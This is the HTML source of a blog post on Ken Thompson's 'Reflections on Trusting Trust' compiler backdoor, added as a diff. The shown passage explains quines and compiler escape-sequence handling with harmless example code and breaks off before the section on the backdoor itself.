@@ -1,0 +1,1053 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+
+    <!-- Enable responsiveness on mobile devices -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    
+      
+        
+        <meta name="description" content="When Ken Thompson won the Turing Award jointly with Dennis Ritchie for their
+work in UNIX, he was expected like other Turing winners to write a paper that
+would be published in the ACM Computer Journal. What he ended up submitting was
+a paper about &quot;the cutest program [he] ever wrote&quot;-- a sneaky undetectable
+self-reproducing &quot;Trojan horse&quot; backdoor in the C compiler that would allow him
+to log into affected machines as any user." />
+        <meta property="og:description" content="When Ken Thompson won the Turing Award jointly with Dennis Ritchie for their
+work in UNIX, he was expected like other Turing winners to write a paper that
+would be published in the ACM Computer Journal. What he ended up submitting was
+a paper about &quot;the cutest program [he] ever wrote&quot;-- a sneaky undetectable
+self-reproducing &quot;Trojan horse&quot; backdoor in the C compiler that would allow him
+to log into affected machines as any user." />
+        <meta property="twitter:description" content="When Ken Thompson won the Turing Award jointly with Dennis Ritchie for their
+work in UNIX, he was expected like other Turing winners to write a paper that
+would be published in the ACM Computer Journal. What he ended up submitting was
+a paper about &quot;the cutest program [he] ever wrote&quot;-- a sneaky undetectable
+self-reproducing &quot;Trojan horse&quot; backdoor in the C compiler that would allow him
+to log into affected machines as any user." />
+      
+    
+
+    <!-- Title -->
+    
+      
+    
+    <title>
+    
+    That Time Ken Thompson Wrote a Backdoor into the C Compiler
+    
+</title>
+
+    <!-- Additional Facebook Meta Tags -->
+    <meta property="og:site_name" content="Micah&#x27;s Secret Blog" />
+    <meta
+      property="og:url"
+      content="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog&#x2F;thompson-trojan-horse&#x2F;"
+    />
+    <meta
+      property="og:type"
+      content="article"
+    />
+    <meta property="og:title" content="That Time Ken Thompson Wrote a Backdoor into the C Compiler" />
+
+    <!-- Additional Twitter Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta
+      property="twitter:url"
+      content="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog&#x2F;thompson-trojan-horse&#x2F;"
+    />
+    <meta name="twitter:title" content="That Time Ken Thompson Wrote a Backdoor into the C Compiler" />
+
+    <!-- Additional Fediverse Tags -->
+     
+
+    <!-- Cover images -->
+    
+    
+
+    <meta
+      property="og:image"
+      content="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog&#x2F;icons&#x2F;favicon&#x2F;web-app-manifest-512x512.png"
+    />
+
+    <meta
+      name="twitter:image"
+      content="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog&#x2F;icons&#x2F;favicon&#x2F;web-app-manifest-512x512.png"
+    />
+
+    <!-- Favicons -->
+    
+    <link
+      rel="icon"
+      type="image/png"
+      href="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog/icons/favicon/favicon-96x96.png"
+      sizes="96x96"
+    />
+    <link
+      rel="icon"
+      type="image/svg+xml"
+      href="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog/icons/favicon/favicon.svg"
+    />
+    <link
+      rel="shortcut icon"
+      href="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog/icons/favicon/favicon.ico"
+    />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog/icons/favicon/apple-touch-icon.png"
+    />
+    <meta name="apple-mobile-web-app-title" content="That Time Ken Thompson Wrote a Backdoor into the C Compiler" />
+    <link
+      rel="manifest"
+      href="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog/icons/favicon/site.webmanifest"
+    />
+    
+
+    <!-- RSS Feed -->
+    
+    <link
+      rel="alternate"
+      type="application/atom+xml"
+      title="RSS"
+      href="https://micahkepe.com/blog/atom.xml"
+    />
+    
+
+    <!-- Load Styles -->
+    
+
+
+      <link
+        rel="stylesheet"
+        href="https://micahkepe.com/blog/site.css"
+      />
+    
+
+<!-- Custom styling -->
+<link
+  rel="stylesheet"
+  href="https://micahkepe.com/blog/custom.css"
+/>
+
+
+
+    <!-- Syntax highlighting theming -->
+    
+      <link
+         rel="stylesheet" type="text/css"
+         href="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog/syntax/syntax-theme-dark.css"
+      />
+      <link
+         rel="stylesheet" type="text/css"
+         href="https:&#x2F;&#x2F;micahkepe.com&#x2F;blog/syntax/syntax-theme-light.css"
+      />
+    
+
+    <!-- Load Fonts -->
+    
+
+  
+
+
+
+
+
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
+  
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
+  
+
+
+
+<!-- Forcing Font -->
+<style>
+body {
+  font-family:
+    "JetBrains Mono", Menlo, Monaco, Lucida Console, Liberation Mono,
+    DejaVu Sans Mono, Bitstream Vera Sans Mono, Courier New,
+    monospace, serif !important;
+}
+</style>
+
+
+    <!-- Pass Theme Preference as Data Attribute -->
+    <script src="https://micahkepe.com/blog/js/init-theme.js"></script>
+
+    <!-- Reference return to click position script -->
+    <script defer src="https://micahkepe.com/blog/js/reference-return.js"></script>
+
+    <!-- Additional scripts -->
+    
+      
+        <script defer src="https://micahkepe.com/blog/js/codeblock.js"></script>
+      
+      
+        <script src="https://micahkepe.com/blog/js/toggle-theme.js"></script>
+      
+      
+<!-- MathJax script for rendering LaTeX math equations -->
+<script src="https://micahkepe.com/blog/js/mathjax-config.js"></script>
+<script
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+  async
+></script>
+
+
+      
+<script type="text/javascript" src="https://micahkepe.com/blog/elasticlunr.min.js"></script>
+<script type="text/javascript" src="https://micahkepe.com/blog/js/search.js"></script>
+
+    
+  </head>
+
+  <!-- Body element (contents of the page) -->
+  <body class="hack main container">
+    
+
+  
+    
+    
+      
+  
+  <section class="nav-header">
+    <nav
+      itemscope
+      itemtype="http://schema.org/SiteNavigationElement"
+      class="navbar"
+    >
+      <section class="nav-links">
+        
+        <a
+          itemprop="url"
+          class=""
+          href="https://micahkepe.com/blog/"
+        >
+          <span itemprop="name">Home</span>
+        </a>
+        
+        <a
+          itemprop="url"
+          class=""
+          href="https://micahkepe.com/blog/categories"
+        >
+          <span itemprop="name">Categories</span>
+        </a>
+        
+        <a
+          itemprop="url"
+          class=""
+          href="https://micahkepe.com/blog/tags"
+        >
+          <span itemprop="name">Tags</span>
+        </a>
+        
+        <a
+          itemprop="url"
+          class=""
+          href="https://micahkepe.com/"
+        >
+          <span itemprop="name">Main Site</span>
+        </a>
+        
+      </section>
+    </nav>
+    <aside class="user-actions-container">
+      
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        fill="none"
+        viewBox="0 0 24 24"
+        stroke-width="1.5"
+        class="search-icon"
+      >
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607Z"
+        />
+      </svg>
+      <input type="text" id="search" placeholder="Search..." />
+      <section class="search-results" aria-live="polite">
+        <article class="search-results__items" role="list"></article>
+      </section>
+       
+      <a id="dark-mode-toggle" href="#">
+        <img
+          src="https://micahkepe.com/blog/icons/sun.svg"
+          id="sun-icon"
+          class="invert-icon"
+          alt="Light mode"
+        />
+        <img
+          src="https://micahkepe.com/blog/icons/moon.svg"
+          id="moon-icon"
+          alt="Dark mode"
+        />
+      </a>
+       
+      <a
+        href="https://micahkepe.com/blog/atom.xml"
+        class="feed-icon"
+        rel="noopener noreferrer"
+      >
+        <img
+          src="https://micahkepe.com/blog/icons/rss.svg"
+          id="rss-icon"
+          alt="RSS feed"
+          class="social-icon"
+        />
+      </a>
+       
+      <a
+        href="https:&#x2F;&#x2F;github.com&#x2F;micahkepe"
+        class="feed-icon"
+        rel="noopener noreferrer"
+      >
+        <img
+          src="https://micahkepe.com/blog/icons/github.svg"
+          id="github-icon"
+          alt="GitHub"
+          class="social-icon"
+        />
+      </a>
+       
+    </aside>
+  </section>
+  
+
+    
+
+
+    <main>
+      
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">That Time Ken Thompson Wrote a Backdoor into the C Compiler</h1>
+        <data class="muted">
+    <svg class="icon i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <data>10 minute read</data>
+    <svg class="icon i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2025-10-23
+</data>
+    </header>
+
+    <article itemprop="articleBody">
+        
+            <p>When Ken Thompson won the Turing Award jointly with Dennis Ritchie for their
+work in UNIX, he was expected like other Turing winners to write a paper that
+would be published in the ACM Computer Journal. What he ended up submitting was
+a paper about "the cutest program [he] ever wrote"-- a sneaky undetectable
+self-reproducing "Trojan horse" backdoor in the C compiler that would allow him
+to log into affected machines as any user.</p>
+
+            
+              <details class="toc-container">
+  <summary class="toc-title">Table of Contents</summary>
+  <ul class="toc-list">
+    
+    <li>
+      <a href="https://micahkepe.com/blog/thompson-trojan-horse/#overview">Overview</a>
+      
+    </li>
+    
+    <li>
+      <a href="https://micahkepe.com/blog/thompson-trojan-horse/#the-trojan-horse">The Trojan Horse</a>
+      
+      <ul>
+        
+        <li>
+          <a href="https://micahkepe.com/blog/thompson-trojan-horse/#stage-i-self-reproducing-programs">Stage I: Self-Reproducing Programs</a>
+        </li>
+         
+        <li>
+          <a href="https://micahkepe.com/blog/thompson-trojan-horse/#stage-ii-compilers-learn">Stage II: Compilers &quot;Learn&quot;</a>
+        </li>
+         
+        <li>
+          <a href="https://micahkepe.com/blog/thompson-trojan-horse/#stage-iii-slipping-in-the-trojan-horse">Stage III: Slipping in the Trojan Horse</a>
+        </li>
+         
+      </ul>
+      
+    </li>
+    
+    <li>
+      <a href="https://micahkepe.com/blog/thompson-trojan-horse/#the-training-process">The Training Process</a>
+      
+    </li>
+    
+    <li>
+      <a href="https://micahkepe.com/blog/thompson-trojan-horse/#closing">Closing</a>
+      
+    </li>
+    
+    <li>
+      <a href="https://micahkepe.com/blog/thompson-trojan-horse/#references">References</a>
+      
+    </li>
+    
+  </ul>
+</details>
+
+            
+
+            <!-- Render the rest of the content after removing the summary portion -->
+            
+<span id="continue-reading"></span>
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+  
+  
+
+
+<div class="responsive-iframe"
+  style="width: 100%; max-width: 100%; margin: 0 auto; text-align: center;">
+  <iframe
+    src="https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;OmVHkL0IWk4?start=9951&amp;cc_load_policy=1"
+    title="YouTube video player"
+    frameborder="0"
+    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+    referrerpolicy="strict-origin-when-cross-origin"
+    allowfullscreen>
+  </iframe>
+</div>
+<h2 id="overview"><a class="zola-anchor" href="#overview" aria-label="Anchor link for: overview">Overview</a></h2>
+<p>Thompson didn't want to write about the usual things that Turing award winners
+write about— in fact, according to him,<sup class="footnote-reference"><a href="#1">1</a></sup> he didn't want to write a paper at
+all. However, when he did finally write a paper (after putting it off for a year
+past the original deadline, see ~2:52:49 in the above video), he describes at a
+high level how the C compiler (itself a program written in C) parses and
+compiles C source code into machine code to set the stage for how the "Trojan
+horse" would be injected into the generated machine code while leaving the
+original input C source code seemingly unmodified.</p>
+<p>He explains that while in college at UC Berkeley, him and colleagues would
+"[amuse themselves] by posing programming exercises," one of which was "to
+write the shortest self-reproducing program":</p>
+<blockquote>
+<p>More precisely stated, the problem is to write a source program that, when
+compiled and executed, will produce as output an exact copy of its source ...
+The part about "shortest" was just an incentive to demonstrate skill and
+determine a winner.</p>
+</blockquote>
+<h2 id="the-trojan-horse"><a class="zola-anchor" href="#the-trojan-horse" aria-label="Anchor link for: the-trojan-horse">The Trojan Horse</a></h2>
+<p>In this section, I'll try to illustrate the "Trojan horse" originally presented
+by Thompson through a combination of the original quasi-C pseudocode and the
+source code and examples from Russ Cox's article on this subject, where Cox got
+Thompson to actually send him the source code after seeing a talk Thompson gave
+in 2023.<sup class="footnote-reference"><a href="#2">2</a></sup></p>
+<h3 id="stage-i-self-reproducing-programs"><a class="zola-anchor" href="#stage-i-self-reproducing-programs" aria-label="Anchor link for: stage-i-self-reproducing-programs">Stage I: Self-Reproducing Programs</a></h3>
+<p>In this stage, Thompson describes a self-reproducing program (also known as a
+"quine"<sup class="footnote-reference"><a href="#3">3</a></sup>). The key insight is that a program can contain its own source code
+as data, which it then prints along with the code to print it.</p>
+<p>Here's Thompson's example from the paper:</p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Figure 1 <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c"><span class="z-storage z-type z-c">char</span> s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span><span class="z-punctuation z-section z-brackets z-end z-c">]</span></span> <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\t</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-separator z-c">,</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>0<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-separator z-c">,</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-separator z-c">,</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-comment z-line z-double-slash z-c"><span class="z-punctuation z-definition z-comment z-c">//</span> (213 lines deleted)
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-constant z-numeric z-integer z-decimal z-c">0</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span>
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">  <span class="z-punctuation z-definition z-comment z-c">*</span> The string s is a
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">  <span class="z-punctuation z-definition z-comment z-c">*</span> representation of the body
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">  <span class="z-punctuation z-definition z-comment z-c">*</span> of this program from `0`
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c">  <span class="z-punctuation z-definition z-comment z-c">*</span> to the end.
+</span></span><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c">
+</span><span class="z-source z-c"><span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">main</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span>
+</span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-storage z-type z-c">int</span> i<span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">printf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>char<span class="z-constant z-character z-escape z-c">\t</span>s[ ] = {<span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-keyword z-control z-c">for</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>i <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-constant z-numeric z-integer z-decimal z-c">0</span><span class="z-punctuation z-terminator z-c">;</span> s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span><span class="z-punctuation z-terminator z-c">;</span> i<span class="z-keyword z-operator z-arithmetic z-c">++</span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">    <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">printf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span><span class="z-constant z-character z-escape z-c">\t</span><span class="z-constant z-other z-placeholder z-c">%d</span>,<span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-separator z-c">,</span> s<span class="z-meta z-brackets z-c"><span class="z-punctuation z-section z-brackets z-begin z-c">[</span>i<span class="z-punctuation z-section z-brackets z-end z-c">]</span></span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-meta z-block z-c">  <span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">  <span class="z-meta z-function-call z-c"><span class="z-support z-function z-C99 z-c">printf</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span><span class="z-constant z-other z-placeholder z-c">%s</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span><span class="z-punctuation z-separator z-c">,</span> s</span></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></code></pre>
+<p>There are two critical properties here to make note of for later:</p>
+<ol>
+<li>"This program can easily be written by another program."</li>
+<li>"This program can contain an arbitrary amount of excess baggage that will be
+reproduced along with the main algorithm."</li>
+</ol>
+<article class="note-container">
+  <details  class="note-details">
+    <summary class="note-header">
+      
+      <section class="note-icon">
+        <p>'Simple Transliterations' Note from Original Paper</p>
+
+      </section>
+      
+    </summary>
+    <section class="note-content">
+      <p>Here are some simple transliterations to allow a non-C programmer to read this
+code:</p>
+<table><thead><tr><th>Operator</th><th>Meaning</th></tr></thead><tbody>
+<tr><td><code>=</code></td><td>assignment</td></tr>
+<tr><td><code>==</code></td><td>equal to</td></tr>
+<tr><td><code>!=</code></td><td>not equal to</td></tr>
+<tr><td><code>++</code></td><td>increment</td></tr>
+<tr><td>`x`</td><td>single character constant</td></tr>
+<tr><td>"xxx"</td><td>multiple character string</td></tr>
+<tr><td><em>%d</em></td><td>format to convert to decimal</td></tr>
+<tr><td><em>%s</em></td><td>format to convert to string</td></tr>
+<tr><td><em>\t</em></td><td>tab character</td></tr>
+<tr><td><em>\n</em></td><td>newline character</td></tr>
+</tbody></table>
+
+    </section>
+  </details>
+</article>
+<p>Here's a classic Python quine to demonstrate the self-reproducing behavior:</p>
+<pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">s</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-single z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&#39;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-single z-python">s = <span class="z-constant z-other z-placeholder z-python">%r</span><span class="z-constant z-character z-escape z-python">\n</span>print(s <span class="z-constant z-other z-placeholder z-python">%%</span> s)<span class="z-punctuation z-definition z-string z-end z-python">&#39;</span></span></span>
+</span><span class="z-source z-python"><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">print</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">s</span></span> <span class="z-keyword z-operator z-arithmetic z-python">%</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">s</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
+</span></code></pre>
+<p><code>s</code> holds a string that is almost the whole program, including the placeholder
+<code>%r</code>, which formats via <code>repr()</code>. The <code>print(s % s)</code> uses Python's old C-style
+<code>%</code>-formatting.</p>
+<p>Important notes about the characters inside <code>s</code>:</p>
+<ul>
+<li><code>%r</code> is a placeholder: it tells Python to insert the <code>repr()</code> of the argument
+doing the <code>%</code>-formatting.</li>
+<li><code>\n</code> is the newline character to separate the two source lines produced in the
+output.</li>
+<li><code>%%</code> is to be able to include a literal <code>%</code> in a string that will be used with
+<code>%</code>-formatting; after formatting it becomes a single <code>%</code>.</li>
+</ul>
+<p>The <code>%r</code> inside the string is replaced by the Python string representation of
+<code>s</code> itself, so the program prints the text of <code>s = ...</code> followed by the <code>print</code>
+line. The <code>%r</code> is the key as it auto-escapes and auto-quotes the representation
+so the printed string is a valid piece of Python code. Here's the result of
+running the program:</p>
+<pre class="z-code"><code><span class="z-text z-plain">Python 3.13.2 (main, Feb 26 2025, 14:47:35) [Clang 16.0.0 (clang-1600.0.26.6)] on darwin
+</span><span class="z-text z-plain">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+</span><span class="z-text z-plain">&gt;&gt;&gt; s = &#39;s = %r\nprint(s %% s)&#39;
+</span><span class="z-text z-plain">... print(s % s)
+</span><span class="z-text z-plain">...
+</span><span class="z-text z-plain">s = &#39;s = %r\nprint(s %% s)&#39;
+</span><span class="z-text z-plain">print(s % s)
+</span></code></pre>
+<h3 id="stage-ii-compilers-learn"><a class="zola-anchor" href="#stage-ii-compilers-learn" aria-label="Anchor link for: stage-ii-compilers-learn">Stage II: Compilers "Learn"</a></h3>
+<p>Thompson uses the example of how the C compiler handles character escape
+sequences to show how a compiler can teach itself new knowledge.</p>
+<p>In C, you can write string literals with escape sequences:</p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-string z-quoted z-double z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&quot;</span>Hello world<span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&quot;</span></span>
+</span></code></pre>
+<p>The compiler needs to know what character code <code>\n</code> represents. Here's the
+clever part: the compiler can learn this in a completely portable way.</p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Figure 2.1 - Original escape sequence handling <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c">c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">next</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span><span class="z-source z-c"><span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\\</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">next</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">    <span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span>n<span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c">        c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\n</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span></span><span class="z-source z-c"><span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-end z-c">}</span></span>
+</span></code></pre>
+<p>This code handles the backslash escape sequences. Notice how it uses <code>'\n'</code> to
+return the newline character—the compiler "knows" what <code>\n</code> means because it's
+baked-in to C itself.</p>
+<p>Ok, now suppose we want to add support for <code>\v</code> (vertical tab). We'd like to write:</p>
+<pre data-lang="c" class="language-c z-code"><code class="language-c" data-lang="c"><span class="z-source z-c"><span class="z-comment z-block z-c"><span class="z-punctuation z-definition z-comment z-c">/*</span> Figure 2.2 - Desired code with \v support <span class="z-punctuation z-definition z-comment z-c">*/</span></span>
+</span><span class="z-source z-c">c <span class="z-keyword z-operator z-assignment z-c">=</span> <span class="z-meta z-function-call z-c"><span class="z-variable z-function z-c">next</span><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span></span></span><span class="z-meta z-function-call z-c"></span><span class="z-meta z-function-call z-c"><span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-end z-c">)</span></span></span><span class="z-punctuation z-terminator z-c">;</span>
+</span><span class="z-source z-c"><span class="z-keyword z-control z-c">if</span> <span class="z-meta z-group z-c"><span class="z-punctuation z-section z-group z-begin z-c">(</span>c <span class="z-keyword z-operator z-comparison z-c">==</span> <span class="z-string z-quoted z-single z-c"><span class="z-punctuation z-definition z-string z-begin z-c">&#39;</span><span class="z-constant z-character z-escape z-c">\\</span><span class="z-punctuation z-definition z-string z-end z-c">&#39;</span></span><span class="z-punctuation z-section z-group z-end z-c">)</span></span> <span class="z-meta z-block z-c"><span class="z-punctuation z-section z-block z-begin z-c">{</span>
